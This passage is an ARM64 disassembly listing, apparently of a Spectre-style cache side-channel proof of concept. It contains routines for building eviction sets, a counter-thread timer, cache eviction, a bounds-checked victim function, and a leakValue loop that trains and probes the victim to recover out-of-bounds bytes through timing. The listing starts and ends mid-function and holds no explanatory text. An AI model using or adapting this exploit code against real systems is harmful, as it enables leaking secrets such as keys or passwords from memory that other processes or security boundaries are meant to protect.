0000000100002d50	ldp	x24, x23, [sp], #0x40
0000000100002d54	ret
_list_split:
0000000100002d58	cbz	x0, 0x100002df0
0000000100002d5c	stp	x22, x21, [sp, #-0x30]!
0000000100002d60	stp	x20, x19, [sp, #0x10]
0000000100002d64	stp	x29, x30, [sp, #0x20]
0000000100002d68	add	x29, sp, #0x20
0000000100002d6c	mov	x21, x2
0000000100002d70	mov	x19, x1
0000000100002d74	mov	x20, x0
0000000100002d78	bl	_list_length
0000000100002d7c	mov	x8, #0x0
0000000100002d80	sub	w9, w21, #0x1
0000000100002d84	bic	w10, w21, w21, asr #31
0000000100002d88	sdiv	w11, w0, w21
0000000100002d8c	b	0x100002d94
0000000100002d90	add	x8, x8, #0x1
0000000100002d94	cmp	x8, x10
0000000100002d98	b.eq	0x100002de4
0000000100002d9c	str	x20, [x19, x8, lsl #3]
0000000100002da0	cbz	x20, 0x100002da8
0000000100002da4	str	xzr, [x20, #0x8]
0000000100002da8	mov	w12, #0x1
0000000100002dac	cbz	x20, 0x100002d90
0000000100002db0	ldr	x20, [x20]
0000000100002db4	add	w13, w12, #0x1
0000000100002db8	cmp	w12, w11
0000000100002dbc	mov	x12, x13
0000000100002dc0	b.lt	0x100002dac
0000000100002dc4	mov	x12, x13
0000000100002dc8	cmp	x8, x9
0000000100002dcc	b.eq	0x100002dac
0000000100002dd0	cbz	x20, 0x100002d90
0000000100002dd4	ldr	x12, [x20, #0x8]
0000000100002dd8	cbz	x12, 0x100002d90
0000000100002ddc	str	xzr, [x12]
0000000100002de0	b	0x100002d90
0000000100002de4	ldp	x29, x30, [sp, #0x20]
0000000100002de8	ldp	x20, x19, [sp, #0x10]
0000000100002dec	ldp	x22, x21, [sp], #0x30
0000000100002df0	ret
_list_from_chunks:
0000000100002df4	ldr	x8, [x0]
0000000100002df8	cbz	x8, 0x100002ec4
0000000100002dfc	cbz	x1, 0x100002ec4
0000000100002e00	add	w8, w2, #0x1
0000000100002e04	sdiv	w9, w8, w3
0000000100002e08	msub	w9, w9, w3, w8
0000000100002e0c	ldr	x8, [x1, w9, sxtw #3]
0000000100002e10	cbz	x8, 0x100002ec4
0000000100002e14	ldr	x10, [x1, w2, sxtw #3]
0000000100002e18	cbz	x10, 0x100002e20
0000000100002e1c	str	xzr, [x10, #0x8]
0000000100002e20	sxtw	x8, w9
0000000100002e24	cbz	x10, 0x100002e44
0000000100002e28	mov	x11, x10
0000000100002e2c	ldr	x10, [x10]
0000000100002e30	cbz	x10, 0x100002e40
0000000100002e34	ldr	x12, [x1, x8, lsl #3]
0000000100002e38	cmp	x10, x12
0000000100002e3c	b.ne	0x100002e24
0000000100002e40	str	xzr, [x11]
0000000100002e44	ldr	x10, [x1, x8, lsl #3]
0000000100002e48	str	x10, [x0]
0000000100002e4c	cbz	x10, 0x100002e60
0000000100002e50	mov	x8, #0x0
0000000100002e54	mov	x0, x10
0000000100002e58	str	x8, [x10, #0x8]
0000000100002e5c	mov	x10, x0
0000000100002e60	mov	x8, x10
0000000100002e64	b	0x100002e74
0000000100002e68	str	x12, [x8]
0000000100002e6c	ldr	x10, [x1, x10, lsl #3]
0000000100002e70	cbnz	x10, 0x100002ec8
0000000100002e74	cmp	w9, w2
0000000100002e78	b.eq	0x100002ebc
0000000100002e7c	ldr	x10, [x1, w9, sxtw #3]
0000000100002e80	cbz	x10, 0x100002ebc
0000000100002e84	add	w9, w9, #0x1
0000000100002e88	sdiv	w10, w9, w3
0000000100002e8c	msub	w9, w10, w3, w9
0000000100002e90	sxtw	x10, w9
0000000100002e94	cbz	x8, 0x100002e6c
0000000100002e98	ldr	x11, [x8]
0000000100002e9c	ldr	x12, [x1, x10, lsl #3]
0000000100002ea0	cmp	x11, #0x0
0000000100002ea4	ccmp	x11, x12, #0x4, ne
0000000100002ea8	b.eq	0x100002e68
0000000100002eac	str	x8, [x11, #0x8]
0000000100002eb0	ldr	x8, [x8]
0000000100002eb4	cbnz	x8, 0x100002e98
0000000100002eb8	b	0x100002e6c
0000000100002ebc	cbz	x8, 0x100002ec4
0000000100002ec0	str	xzr, [x8]
0000000100002ec4	ret
0000000100002ec8	mov	x0, x8
0000000100002ecc	b	0x100002e58
_tests_avg:
0000000100002ed0	stp	x22, x21, [sp, #-0x30]!
0000000100002ed4	stp	x20, x19, [sp, #0x10]
0000000100002ed8	stp	x29, x30, [sp, #0x20]
0000000100002edc	add	x29, sp, #0x20
0000000100002ee0	mov	x19, x1
0000000100002ee4	mov	x20, x0
0000000100002ee8	mov	w21, #0x0
0000000100002eec	mov	w22, #0x32
0000000100002ef0	cbz	w22, 0x100002f14
0000000100002ef4	mov	x0, x20
0000000100002ef8	mov	x1, x19
0000000100002efc	bl	_test_set
0000000100002f00	cmp	w0, #0x320
0000000100002f04	csel	w8, w0, wzr, lo
0000000100002f08	add	w21, w21, w8
0000000100002f0c	sub	w22, w22, #0x1
0000000100002f10	cbnz	w22, 0x100002ef4
0000000100002f14	ucvtf	s0, w21
0000000100002f18	mov	w8, #0x42480000
0000000100002f1c	fmov	s1, w8
0000000100002f20	fdiv	s0, s0, s1
0000000100002f24	fcvtzs	w8, s0
0000000100002f28	adrp	x9, 6 ; 0x100008000
0000000100002f2c	ldrb	w9, [x9]
0000000100002f30	cmp	w9, #0x0
0000000100002f34	mov	w9, #0xdc
0000000100002f38	csel	x9, x9, xzr, ne
0000000100002f3c	cmp	x9, w8, sxtw
0000000100002f40	cset	w0, lo
0000000100002f44	ldp	x29, x30, [sp, #0x20]
0000000100002f48	ldp	x20, x19, [sp, #0x10]
0000000100002f4c	ldp	x22, x21, [sp], #0x30
0000000100002f50	ret
_list_concat:
0000000100002f54	cbz	x0, 0x100002f7c
0000000100002f58	ldr	x8, [x0]
0000000100002f5c	cbz	x8, 0x100002f7c
0000000100002f60	mov	x9, x8
0000000100002f64	ldr	x8, [x8]
0000000100002f68	cbnz	x8, 0x100002f60
0000000100002f6c	str	x1, [x9]
0000000100002f70	cbz	x1, 0x100002f78
0000000100002f74	str	x9, [x1, #0x8]
0000000100002f78	ret
0000000100002f7c	str	x1, [x0]
0000000100002f80	ret
_test_set:
0000000100002f84	stp	x20, x19, [sp, #-0x20]!
0000000100002f88	stp	x29, x30, [sp, #0x10]
0000000100002f8c	add	x29, sp, #0x10
0000000100002f90	mov	x19, x1
0000000100002f94	ldr	x10, [x1]
0000000100002f98	ldr	x10, [x1]
0000000100002f9c	dmb	sy
0000000100002fa0	isb
0000000100002fa4	bl	_traverse_list_skylake
0000000100002fa8	dmb	sy
0000000100002fac	isb
0000000100002fb0	adrp	x8, 6 ; 0x100008000
0000000100002fb4	ldr	w9, [x8, #0x80]
0000000100002fb8	dmb	sy
0000000100002fbc	isb
0000000100002fc0	ldr	x10, [x19]
0000000100002fc4	dmb	sy
0000000100002fc8	isb
0000000100002fcc	ldr	w8, [x8, #0x80]
0000000100002fd0	dmb	sy
0000000100002fd4	isb
0000000100002fd8	sub	w0, w8, w9
0000000100002fdc	ldp	x29, x30, [sp, #0x10]
0000000100002fe0	ldp	x20, x19, [sp], #0x20
0000000100002fe4	ret
_cache_remove:
0000000100002fe8	nop
0000000100002fec	ldr	x8, #0x501c
0000000100002ff0	ldr	x0, [x8, w0, uxtw #3]
0000000100002ff4	b	_traverse_list_skylake
_cache_remove_prepare:
0000000100002ff8	stp	x26, x25, [sp, #-0x50]!
0000000100002ffc	stp	x24, x23, [sp, #0x10]
0000000100003000	stp	x22, x21, [sp, #0x20]
0000000100003004	stp	x20, x19, [sp, #0x30]
0000000100003008	stp	x29, x30, [sp, #0x40]
000000010000300c	add	x29, sp, #0x40
0000000100003010	mov	x19, x0
0000000100003014	adrp	x22, 5 ; 0x100008000
0000000100003018	ldr	x8, [x22, #0x8]
000000010000301c	cbnz	x8, 0x100003024
0000000100003020	bl	_evset_init
0000000100003024	bl	_timer_start
0000000100003028	mov	x23, #0x0
000000010000302c	adrp	x21, 5 ; 0x100008000
0000000100003030	adrp	x24, 5 ; 0x100008000
0000000100003034	adrp	x25, 5 ; 0x100008000
0000000100003038	mov	w26, #0xdc
000000010000303c	ldrsw	x20, [x21, #0x1c]
0000000100003040	cmp	x23, x20
0000000100003044	b.hs	0x1000030c0
0000000100003048	ldr	x10, [x19]
000000010000304c	ldr	x10, [x19]
0000000100003050	dmb	sy
0000000100003054	isb
0000000100003058	ldr	x8, [x22, #0x8]
000000010000305c	lsl	x20, x23, #3
0000000100003060	ldr	x0, [x8, x20]
0000000100003064	bl	_traverse_list_skylake
0000000100003068	ldr	x8, [x22, #0x8]
000000010000306c	ldr	x0, [x8, x20]
0000000100003070	bl	_traverse_list_skylake
0000000100003074	dmb	sy
0000000100003078	isb
000000010000307c	ldr	x8, [x24, #0x80]
0000000100003080	dmb	sy
0000000100003084	isb
0000000100003088	ldr	x10, [x19]
000000010000308c	dmb	sy
0000000100003090	isb
0000000100003094	ldr	x9, [x24, #0x80]
0000000100003098	dmb	sy
000000010000309c	isb
00000001000030a0	ldrb	w10, [x25]
00000001000030a4	cmp	w10, #0x0
00000001000030a8	csel	x10, x26, xzr, ne
00000001000030ac	sub	x8, x9, x8
00000001000030b0	cmp	x8, x10
00000001000030b4	b.hi	0x100003110
00000001000030b8	add	x23, x23, #0x1
00000001000030bc	b	0x10000303c
00000001000030c0	add	w8, w20, #0x1
00000001000030c4	str	w8, [x21, #0x1c]
00000001000030c8	and	w8, w8, #0x80000007
00000001000030cc	cmp	w8, #0x1
00000001000030d0	b.ne	0x100003100
00000001000030d4	ldr	x0, [x22, #0x8]
00000001000030d8	add	w8, w20, #0x9
00000001000030dc	sbfiz	x21, x8, #3, #32
00000001000030e0	mov	x1, x21
00000001000030e4	bl	0x100003d14 ; symbol stub for: _realloc
00000001000030e8	str	x0, [x22, #0x8]
00000001000030ec	adrp	x22, 5 ; 0x100008000
00000001000030f0	ldr	x0, [x22, #0x10]
00000001000030f4	mov	x1, x21
00000001000030f8	bl	0x100003d14 ; symbol stub for: _realloc
00000001000030fc	str	x0, [x22, #0x10]
0000000100003100	mov	x0, x19
0000000100003104	bl	_evset_find
0000000100003108	bl	_timer_stop
000000010000310c	b	0x100003114
0000000100003110	mov	x20, x23
0000000100003114	mov	x0, x20
0000000100003118	ldp	x29, x30, [sp, #0x40]
000000010000311c	ldp	x20, x19, [sp, #0x30]
0000000100003120	ldp	x22, x21, [sp, #0x20]
0000000100003124	ldp	x24, x23, [sp, #0x10]
0000000100003128	ldp	x26, x25, [sp], #0x50
000000010000312c	ret
_traverse_list_skylake:
0000000100003130	cbz	x0, 0x10000317c
0000000100003134	ldr	x8, [x0]
0000000100003138	cbz	x8, 0x10000317c
000000010000313c	ldr	x8, [x8]
0000000100003140	cbz	x8, 0x10000317c
0000000100003144	ldr	x10, [x0]
0000000100003148	ldr	x8, [x0]
000000010000314c	ldr	x10, [x8]
0000000100003150	ldr	x8, [x0]
0000000100003154	ldr	x8, [x8]
0000000100003158	ldr	x10, [x8]
000000010000315c	ldr	x10, [x0]
0000000100003160	ldr	x8, [x0]
0000000100003164	ldr	x10, [x8]
0000000100003168	ldr	x8, [x0]
000000010000316c	ldr	x8, [x8]
0000000100003170	ldr	x10, [x8]
0000000100003174	ldr	x0, [x0]
0000000100003178	cbnz	x0, 0x100003134
000000010000317c	ret
_counter_thread_thread:
0000000100003180	ldr	x10, [x0]
0000000100003184	add	x10, x10, #0x1
0000000100003188	str	x10, [x0]
000000010000318c	b	0x100003184
0000000100003190	mov	x0, #0x0
0000000100003194	ret
_timer_start:
0000000100003198	adrp	x8, 5 ; 0x100008000
000000010000319c	ldr	w9, [x8, #0x38]
00000001000031a0	add	w10, w9, #0x1
00000001000031a4	str	w10, [x8, #0x38]
00000001000031a8	cbz	w9, 0x1000031b0
00000001000031ac	ret
00000001000031b0	adr	x0, #0x4e90
00000001000031b4	nop
00000001000031b8	adr	x2, #-0x38
00000001000031bc	nop
00000001000031c0	adr	x3, #0x4ec0
00000001000031c4	nop
00000001000031c8	mov	x1, #0x0
00000001000031cc	b	0x100003ce4 ; symbol stub for: _pthread_create
_timer_stop:
00000001000031d0	adrp	x8, 5 ; 0x100008000
00000001000031d4	ldr	w9, [x8, #0x38]
00000001000031d8	subs	w9, w9, #0x1
00000001000031dc	str	w9, [x8, #0x38]
00000001000031e0	b.eq	0x1000031e8
00000001000031e4	ret
00000001000031e8	nop
00000001000031ec	ldr	x0, #0x4e54
00000001000031f0	b	0x100003cd8 ; symbol stub for: _pthread_cancel
_victim:
00000001000031f4	cmp	sp, #0x0
00000001000031f8	csetm	x16, ne
00000001000031fc	lsr	x8, x0, #2
0000000100003200	nop
0000000100003204	ldr	x9, #0x4e54
0000000100003208	and	x9, x9, x16
000000010000320c	csdb
0000000100003210	ldr	x9, [x9]
0000000100003214	and	x9, x9, x16
0000000100003218	csdb
000000010000321c	cmp	x8, x9
0000000100003220	b.hs	0x100003268
0000000100003224	csel	x16, x16, xzr, lo
0000000100003228	ubfiz	w9, w0, #1, #2
000000010000322c	nop
0000000100003230	ldr	x10, #0x4e20
0000000100003234	and	x10, x10, x16
0000000100003238	nop
000000010000323c	ldr	x11, #0x4e0c
0000000100003240	and	x11, x11, x16
0000000100003244	csdb
0000000100003248	ldrsb	w8, [x11, x8]
000000010000324c	and	w8, w8, w16
0000000100003250	csdb
0000000100003254	asr	w8, w8, w9
0000000100003258	ubfiz	w8, w8, #9, #2
000000010000325c	add	x8, x10, x8
0000000100003260	ldr	x10, [x8]
0000000100003264	b	0x10000326c
0000000100003268	csel	x16, x16, xzr, hs
000000010000326c	mov	x0, sp
0000000100003270	and	x0, x0, x16
0000000100003274	mov	sp, x0
0000000100003278	ret
_setup:
000000010000327c	cmp	sp, #0x0
0000000100003280	csetm	x16, ne
0000000100003284	sub	sp, sp, #0x70
0000000100003288	stp	x26, x25, [sp, #0x20]
000000010000328c	stp	x24, x23, [sp, #0x30]
0000000100003290	stp	x22, x21, [sp, #0x40]
0000000100003294	stp	x20, x19, [sp, #0x50]
0000000100003298	stp	x29, x30, [sp, #0x60]
000000010000329c	add	x29, sp, #0x60
00000001000032a0	mov	x19, x1
00000001000032a4	mov	x20, x0
00000001000032a8	adrp	x23, 5 ; 0x100008000
00000001000032ac	ldr	x0, [x23, #0x48]
00000001000032b0	and	x0, x0, x16
00000001000032b4	csdb
00000001000032b8	cmp	x0, #0x0
00000001000032bc	b.eq	0x1000032e0
00000001000032c0	csel	x16, x16, xzr, ne
00000001000032c4	mov	x1, sp
00000001000032c8	and	x1, x1, x16
00000001000032cc	mov	sp, x1
00000001000032d0	bl	0x100003c84 ; symbol stub for: _free
00000001000032d4	cmp	sp, #0x0
00000001000032d8	csetm	x16, ne
00000001000032dc	b	0x1000032e4
00000001000032e0	csel	x16, x16, xzr, eq
00000001000032e4	adrp	x22, 5 ; 0x100008000
00000001000032e8	ldr	x8, [x22, #0x50]
00000001000032ec	and	x8, x8, x16
00000001000032f0	csdb
00000001000032f4	cmp	x8, #0x0
00000001000032f8	b.ne	0x100003328
00000001000032fc	csel	x16, x16, xzr, eq
0000000100003300	mov	w0, #0x800
0000000100003304	mov	x1, sp
0000000100003308	and	x1, x1, x16
000000010000330c	mov	sp, x1
0000000100003310	bl	0x100003ca8 ; symbol stub for: _malloc
0000000100003314	cmp	sp, #0x0
0000000100003318	csetm	x16, ne
000000010000331c	str	x0, [x22, #0x50]
0000000100003320	cmp	x0, #0x0
0000000100003324	b.eq	0x100003634
0000000100003328	csel	x16, x16, xzr, ne
000000010000332c	mov	x0, x20
0000000100003330	mov	x1, sp
0000000100003334	and	x1, x1, x16
0000000100003338	mov	sp, x1
000000010000333c	bl	0x100003d38 ; symbol stub for: _strlen
0000000100003340	cmp	sp, #0x0
0000000100003344	csetm	x16, ne
0000000100003348	add	x25, x0, #0x1
000000010000334c	mov	x0, x19
0000000100003350	mov	x1, sp
0000000100003354	and	x1, x1, x16
0000000100003358	mov	sp, x1
000000010000335c	bl	0x100003d38 ; symbol stub for: _strlen
0000000100003360	cmp	sp, #0x0
0000000100003364	csetm	x16, ne
0000000100003368	add	x8, x25, x0
000000010000336c	add	x0, x8, #0x1
0000000100003370	mov	x1, sp
0000000100003374	and	x1, x1, x16
0000000100003378	mov	sp, x1
000000010000337c	bl	0x100003ca8 ; symbol stub for: _malloc
0000000100003380	cmp	sp, #0x0
0000000100003384	csetm	x16, ne
0000000100003388	str	x0, [x23, #0x48]
000000010000338c	cmp	x0, #0x0
0000000100003390	b.eq	0x100003468
0000000100003394	csel	x16, x16, xzr, ne
0000000100003398	mov	x21, x0
000000010000339c	adrp	x24, 5 ; 0x100008000
00000001000033a0	ldr	x0, [x24, #0x58]
00000001000033a4	and	x0, x0, x16
00000001000033a8	csdb
00000001000033ac	cmp	x0, #0x0
00000001000033b0	b.ne	0x1000033e0
00000001000033b4	csel	x16, x16, xzr, eq
00000001000033b8	mov	w0, #0x8
00000001000033bc	mov	x1, sp
00000001000033c0	and	x1, x1, x16
00000001000033c4	mov	sp, x1
00000001000033c8	bl	0x100003ca8 ; symbol stub for: _malloc
00000001000033cc	cmp	sp, #0x0
00000001000033d0	csetm	x16, ne
00000001000033d4	str	x0, [x24, #0x58]
00000001000033d8	cmp	x0, #0x0
00000001000033dc	b.eq	0x10000368c
00000001000033e0	csel	x16, x16, xzr, ne
00000001000033e4	str	x25, [x0]
00000001000033e8	mov	x0, x21
00000001000033ec	mov	x1, x20
00000001000033f0	mov	x0, sp
00000001000033f4	and	x0, x0, x16
00000001000033f8	mov	sp, x0
00000001000033fc	bl	0x100003d2c ; symbol stub for: _strcpy
0000000100003400	cmp	sp, #0x0
0000000100003404	csetm	x16, ne
0000000100003408	ldr	x8, [x23, #0x48]
000000010000340c	and	x8, x8, x16
0000000100003410	ldr	x9, [x24, #0x58]
0000000100003414	and	x9, x9, x16
0000000100003418	csdb
000000010000341c	ldr	x9, [x9]
0000000100003420	and	x9, x9, x16
0000000100003424	csdb
0000000100003428	add	x0, x8, x9
000000010000342c	mov	x1, x19
0000000100003430	mov	x0, sp
0000000100003434	and	x0, x0, x16
0000000100003438	mov	sp, x0
000000010000343c	bl	0x100003d2c ; symbol stub for: _strcpy
0000000100003440	cmp	sp, #0x0
0000000100003444	csetm	x16, ne
0000000100003448	adrp	x8, 5 ; 0x100008000
000000010000344c	ldrb	w9, [x8, #0x60]
0000000100003450	and	w9, w9, w16
0000000100003454	csdb
0000000100003458	tst	w9, #0x1
000000010000345c	b.eq	0x100003520
0000000100003460	csel	x16, x16, xzr, ne
0000000100003464	b	0x100003608
0000000100003468	csel	x16, x16, xzr, eq
000000010000346c	nop
0000000100003470	ldr	x8, #0xb90 ; literal pool symbol address: ___stderrp
0000000100003474	and	x8, x8, x16
0000000100003478	csdb
000000010000347c	ldr	x21, [x8]
0000000100003480	and	x21, x21, x16
0000000100003484	mov	x0, x20
0000000100003488	mov	x1, sp
000000010000348c	and	x1, x1, x16
0000000100003490	mov	sp, x1
0000000100003494	csdb
0000000100003498	bl	0x100003d38 ; symbol stub for: _strlen
000000010000349c	cmp	sp, #0x0
00000001000034a0	csetm	x16, ne
00000001000034a4	mov	x20, x0
00000001000034a8	mov	x0, x19
00000001000034ac	mov	x1, sp
00000001000034b0	and	x1, x1, x16
00000001000034b4	mov	sp, x1
00000001000034b8	bl	0x100003d38 ; symbol stub for: _strlen
00000001000034bc	cmp	sp, #0x0
00000001000034c0	csetm	x16, ne
00000001000034c4	add	x8, x20, x0
00000001000034c8	add	x8, x8, #0x2
00000001000034cc	str	x8, [sp]
00000001000034d0	adr	x1, #0x990 ; literal pool for: "malloc of array1 with size %zu failed\n"
00000001000034d4	nop
00000001000034d8	mov	x0, x21
00000001000034dc	mov	x0, sp
00000001000034e0	and	x0, x0, x16
00000001000034e4	mov	sp, x0
00000001000034e8	bl	0x100003c78 ; symbol stub for: _fprintf
00000001000034ec	cmp	sp, #0x0
00000001000034f0	csetm	x16, ne
00000001000034f4	ldr	x0, [x22, #0x50]
00000001000034f8	and	x0, x0, x16
00000001000034fc	mov	x0, sp
0000000100003500	csdb
0000000100003504	and	x0, x0, x16
0000000100003508	mov	sp, x0
000000010000350c	bl	0x100003c84 ; symbol stub for: _free
0000000100003510	cmp	sp, #0x0
0000000100003514	csetm	x16, ne
0000000100003518	str	xzr, [x22, #0x50]
000000010000351c	b	0x100003724
0000000100003520	csel	x16, x16, xzr, eq
0000000100003524	mov	w9, #0x1
0000000100003528	strb	w9, [x8, #0x60]
000000010000352c	ldr	x0, [x22, #0x50]
0000000100003530	and	x0, x0, x16
0000000100003534	mov	x1, sp
0000000100003538	and	x1, x1, x16
000000010000353c	mov	sp, x1
0000000100003540	csdb
0000000100003544	bl	_cache_remove_prepare
0000000100003548	cmp	sp, #0x0
000000010000354c	csetm	x16, ne
0000000100003550	adr	x19, #0x4b40
0000000100003554	nop
0000000100003558	str	x0, [x19]
000000010000355c	ldr	x8, [x22, #0x50]
0000000100003560	and	x8, x8, x16
0000000100003564	csdb
0000000100003568	add	x0, x8, #0x200
000000010000356c	mov	x1, sp
0000000100003570	and	x1, x1, x16
0000000100003574	mov	sp, x1
0000000100003578	bl	_cache_remove_prepare
000000010000357c	cmp	sp, #0x0
0000000100003580	csetm	x16, ne
0000000100003584	str	x0, [x19, #0x8]
0000000100003588	ldr	x8, [x22, #0x50]
000000010000358c	and	x8, x8, x16
0000000100003590	csdb
0000000100003594	add	x0, x8, #0x400
0000000100003598	mov	x1, sp
000000010000359c	and	x1, x1, x16
00000001000035a0	mov	sp, x1
00000001000035a4	bl	_cache_remove_prepare
00000001000035a8	cmp	sp, #0x0
00000001000035ac	csetm	x16, ne
00000001000035b0	str	x0, [x19, #0x10]
00000001000035b4	ldr	x8, [x22, #0x50]
00000001000035b8	and	x8, x8, x16
00000001000035bc	csdb
00000001000035c0	add	x0, x8, #0x600
00000001000035c4	mov	x1, sp
00000001000035c8	and	x1, x1, x16
00000001000035cc	mov	sp, x1
00000001000035d0	bl	_cache_remove_prepare
00000001000035d4	cmp	sp, #0x0
00000001000035d8	csetm	x16, ne
00000001000035dc	str	x0, [x19, #0x18]
00000001000035e0	ldr	x0, [x24, #0x58]
00000001000035e4	and	x0, x0, x16
00000001000035e8	mov	x1, sp
00000001000035ec	and	x1, x1, x16
00000001000035f0	mov	sp, x1
00000001000035f4	csdb
00000001000035f8	bl	_cache_remove_prepare
00000001000035fc	cmp	sp, #0x0
0000000100003600	csetm	x16, ne
0000000100003604	str	x0, [x19, #0x20]
0000000100003608	ldr	x8, [x24, #0x58]
000000010000360c	and	x8, x8, x16
0000000100003610	csdb
0000000100003614	ldr	x8, [x8]
0000000100003618	and	x8, x8, x16
000000010000361c	csdb
0000000100003620	lsl	x8, x8, #2
0000000100003624	sub	x8, x8, #0x4
0000000100003628	adrp	x9, 5 ; 0x100008000
000000010000362c	str	x8, [x9, #0x68]
0000000100003630	b	0x100003724
0000000100003634	csel	x16, x16, xzr, eq
0000000100003638	nop
000000010000363c	ldr	x8, #0x9c4 ; literal pool symbol address: ___stderrp
0000000100003640	and	x8, x8, x16
0000000100003644	csdb
0000000100003648	ldr	x0, [x8]
000000010000364c	and	x0, x0, x16
0000000100003650	mov	w10, #0x200
0000000100003654	mov	w8, #0x4
0000000100003658	mov	w9, #0x800
000000010000365c	stp	x8, x10, [sp, #0x8]
0000000100003660	str	x9, [sp]
0000000100003664	adr	x1, #0x7be ; literal pool for: "malloc of array2 with size %d failed (%d entries of size %d)\n"
0000000100003668	nop
000000010000366c	mov	x0, sp
0000000100003670	csdb
0000000100003674	and	x0, x0, x16
0000000100003678	mov	sp, x0
000000010000367c	bl	0x100003c78 ; symbol stub for: _fprintf
0000000100003680	cmp	sp, #0x0
0000000100003684	csetm	x16, ne
0000000100003688	b	0x100003724
000000010000368c	csel	x16, x16, xzr, eq
0000000100003690	nop
0000000100003694	ldr	x8, #0x96c ; literal pool symbol address: ___stderrp
0000000100003698	and	x8, x8, x16
000000010000369c	csdb
00000001000036a0	ldr	x0, [x8]
00000001000036a4	and	x0, x0, x16
00000001000036a8	mov	w8, #0x8
00000001000036ac	str	x8, [sp]
00000001000036b0	adr	x1, #0x7d7 ; literal pool for: "malloc of array_size with size %zu failed\n"
00000001000036b4	nop
00000001000036b8	mov	x0, sp
00000001000036bc	csdb
00000001000036c0	and	x0, x0, x16
00000001000036c4	mov	sp, x0
00000001000036c8	bl	0x100003c78 ; symbol stub for: _fprintf
00000001000036cc	cmp	sp, #0x0
00000001000036d0	csetm	x16, ne
00000001000036d4	ldr	x0, [x22, #0x50]
00000001000036d8	and	x0, x0, x16
00000001000036dc	mov	x0, sp
00000001000036e0	csdb
00000001000036e4	and	x0, x0, x16
00000001000036e8	mov	sp, x0
00000001000036ec	bl	0x100003c84 ; symbol stub for: _free
00000001000036f0	cmp	sp, #0x0
00000001000036f4	csetm	x16, ne
00000001000036f8	str	xzr, [x22, #0x50]
00000001000036fc	ldr	x0, [x23, #0x48]
0000000100003700	and	x0, x0, x16
0000000100003704	mov	x0, sp
0000000100003708	csdb
000000010000370c	and	x0, x0, x16
0000000100003710	mov	sp, x0
0000000100003714	bl	0x100003c84 ; symbol stub for: _free
0000000100003718	cmp	sp, #0x0
000000010000371c	csetm	x16, ne
0000000100003720	str	xzr, [x23, #0x48]
0000000100003724	ldp	x29, x30, [sp, #0x60]
0000000100003728	and	x29, x29, x16
000000010000372c	and	x30, x30, x16
0000000100003730	ldp	x20, x19, [sp, #0x50]
0000000100003734	and	x20, x20, x16
0000000100003738	and	x19, x19, x16
000000010000373c	ldp	x22, x21, [sp, #0x40]
0000000100003740	and	x22, x22, x16
0000000100003744	and	x21, x21, x16
0000000100003748	ldp	x24, x23, [sp, #0x30]
000000010000374c	and	x24, x24, x16
0000000100003750	and	x23, x23, x16
0000000100003754	ldp	x26, x25, [sp, #0x20]
0000000100003758	and	x26, x26, x16
000000010000375c	and	x25, x25, x16
0000000100003760	add	sp, sp, #0x70
0000000100003764	mov	x0, sp
0000000100003768	and	x0, x0, x16
000000010000376c	mov	sp, x0
0000000100003770	csdb
0000000100003774	ret
_leakValue:
0000000100003778	cmp	sp, #0x0
000000010000377c	csetm	x16, ne
0000000100003780	sub	sp, sp, #0x70
0000000100003784	stp	x28, x27, [sp, #0x10]
0000000100003788	stp	x26, x25, [sp, #0x20]
000000010000378c	stp	x24, x23, [sp, #0x30]
0000000100003790	stp	x22, x21, [sp, #0x40]
0000000100003794	stp	x20, x19, [sp, #0x50]
0000000100003798	stp	x29, x30, [sp, #0x60]
000000010000379c	add	x29, sp, #0x60
00000001000037a0	mov	x19, x0
00000001000037a4	mov	w8, #0x0
00000001000037a8	adr	x22, #0x48c8
00000001000037ac	nop
00000001000037b0	stp	xzr, xzr, [x22]
00000001000037b4	adrp	x23, 5 ; 0x100008000
00000001000037b8	mov	w24, #0xcccd
00000001000037bc	movk	w24, #0xcccc, lsl #16
00000001000037c0	mov	w25, #0x9998
00000001000037c4	movk	w25, #0x1999, lsl #16
00000001000037c8	mov	w26, #0x9999
00000001000037cc	movk	w26, #0x1999, lsl #16
00000001000037d0	adrp	x27, 5 ; 0x100008000
00000001000037d4	adrp	x28, 5 ; 0x100008000
00000001000037d8	cmp	w8, #0x4
00000001000037dc	b.eq	0x100003abc
00000001000037e0	csel	x16, x16, xzr, ne
00000001000037e4	str	w8, [sp, #0xc]
00000001000037e8	adr	x20, #0x48a8
00000001000037ec	nop
00000001000037f0	ldr	x0, [x20]
00000001000037f4	and	x0, x0, x16
00000001000037f8	mov	x0, sp
00000001000037fc	csdb
0000000100003800	and	x0, x0, x16
0000000100003804	mov	sp, x0
0000000100003808	bl	_cache_remove
000000010000380c	cmp	sp, #0x0
0000000100003810	csetm	x16, ne
0000000100003814	ldr	x0, [x20, #0x8]
0000000100003818	and	x0, x0, x16
000000010000381c	mov	x0, sp
0000000100003820	csdb
0000000100003824	and	x0, x0, x16
0000000100003828	mov	sp, x0
000000010000382c	bl	_cache_remove
0000000100003830	cmp	sp, #0x0
0000000100003834	csetm	x16, ne
0000000100003838	ldr	x0, [x20, #0x10]
000000010000383c	and	x0, x0, x16
0000000100003840	mov	x0, sp
0000000100003844	csdb
0000000100003848	and	x0, x0, x16
000000010000384c	mov	sp, x0
0000000100003850	bl	_cache_remove
0000000100003854	cmp	sp, #0x0
0000000100003858	csetm	x16, ne
000000010000385c	ldr	x0, [x20, #0x18]
0000000100003860	and	x0, x0, x16
0000000100003864	mov	x0, sp
0000000100003868	csdb
000000010000386c	and	x0, x0, x16
0000000100003870	mov	sp, x0
0000000100003874	bl	_cache_remove
0000000100003878	cmp	sp, #0x0
000000010000387c	csetm	x16, ne
0000000100003880	dmb	sy
0000000100003884	isb
0000000100003888	mov	w21, #0x28
000000010000388c	cmp	w21, #0x0
0000000100003890	b.lt	0x100003900
0000000100003894	csel	x16, x16, xzr, ge
0000000100003898	ldr	x8, [x23, #0x68]
000000010000389c	and	x8, x8, x16
00000001000038a0	madd	w9, w21, w24, w25
00000001000038a4	ror	w9, w9, #0x1
00000001000038a8	cmp	w9, w26
00000001000038ac	csdb
00000001000038b0	csel	x20, x19, x8, lo
00000001000038b4	ldr	x0, [x27, #0xb0]
00000001000038b8	and	x0, x0, x16
00000001000038bc	mov	x0, sp
00000001000038c0	csdb
00000001000038c4	and	x0, x0, x16
00000001000038c8	mov	sp, x0
00000001000038cc	bl	_cache_remove
00000001000038d0	cmp	sp, #0x0
00000001000038d4	csetm	x16, ne
00000001000038d8	mov	x0, x20
00000001000038dc	mov	x0, sp
00000001000038e0	and	x0, x0, x16
00000001000038e4	mov	sp, x0
00000001000038e8	bl	_victim
00000001000038ec	cmp	sp, #0x0
00000001000038f0	csetm	x16, ne
00000001000038f4	sub	w21, w21, #0x1
